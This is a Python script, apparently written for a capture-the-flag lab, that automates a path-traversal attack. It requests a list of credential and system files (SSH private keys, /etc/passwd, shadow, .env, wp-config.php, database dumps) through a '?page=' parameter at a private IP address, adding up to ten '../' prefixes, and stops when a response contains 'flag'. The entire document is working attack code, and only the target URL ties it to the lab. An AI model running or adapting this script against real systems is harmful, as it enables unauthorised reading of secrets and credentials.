import requests

common_sensitive_files = [
    ".env",
    "config.php",
    "wp-config.php",
    "web.config",
    "appsettings.json",
    "settings.py",
    "database.yml",
    "secrets.json",
    "credentials.yaml",
    "config.ini",
    "localsettings.py",
    "prod.secret.py",
    "docker-compose.yml",
    "id_rsa",
    "id_dsa",
    "authorized_keys",
    "ssh/authorized_keys",
    "ssh/id_rsa",
    "ssh/id_dsa",
    "shadow",
    "passwd",
    "htpasswd",
    "htaccess",
    "access.log",
    "error.log",
    "etc/passwd",
    "phpinfo.php",
    "backup.sql",
    "db.sqlite3",
    "users.db",
    "data.db",
    "site_settings.json",
    "config.json",
    "config.yaml",
    "config.yml",
    "settings.json",
    "settings.yaml",
    "settings.yml",
    "private.key",
    "server.key",
    "server.crt",
    "ssl-cert-snakeoil.key",
    "ssl-cert-snakeoil.pem",
    "ssl/cert.pem",
    "ssl/key.pem",
]

BASE_URL = "http://192.168.38.130/?page="

def check_file(filename, max_depth=10):
    for depth in range(max_depth + 1):
        traversal = "../" * depth + filename
        url = f"{BASE_URL}{traversal}"
        print(f"Checking URL: {url}")
        try:
            response = requests.get(url, timeout=5)
            if "flag" in response.text:
                print(f"Found 'flag' in response for: {url}")
                return True
        except Exception as e:
            print(f"Error requesting {url}: {e}")

def main():
    for sensitive_file in common_sensitive_files:
        if (check_file(sensitive_file)):
            break

if __name__ == "__main__":
    main()